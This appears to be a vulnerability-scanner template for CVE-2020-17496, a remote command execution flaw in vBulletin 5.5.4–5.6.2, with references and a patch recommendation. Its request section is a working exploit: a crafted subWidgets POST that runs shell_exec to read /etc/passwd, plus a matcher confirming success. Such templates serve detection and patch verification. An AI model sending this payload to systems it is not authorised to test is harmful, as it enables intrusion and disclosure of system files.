id: CVE-2020-17496
info:
  name: vBulletin 5.5.4 - 5.6.2- Remote Command Execution
  author: pussycat0x
  severity: critical
  description: vBulletin versions 5.5.4 through 5.6.2 have a vulnerability that allows
    remote command execution via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel
    request.
  reference:
  - https://www.tenable.com/blog/zero-day-remote-code-execution-vulnerability-in-vbulletin-disclosed
  - https://nvd.nist.gov/vuln/detail/CVE-2020-17496
  - https://seclists.org/fulldisclosure/2020/Aug/5
  - https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-17496
    cwe-id: CWE-74
  tags: vbulletin,rce,kev,tenable,seclists,cve,cve2020
  metadata:
    impact: The impact of CVE-2020-17496 on vBulletin versions 5.5.4 through 5.6.2
      is that remote command execution can occur via manipulated subWidgets data within
      an ajax/render/widget_tabbedcontainer_tab_panel request.
    recommendation: It is recommended to update vBulletin version to patch CVE-2020-17496
      and prevent the remote command execution vulnerability.
requests:
- raw:
  - 'POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec(''cat
    ../../../../../../../../../../../../etc/passwd''); exit;"

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
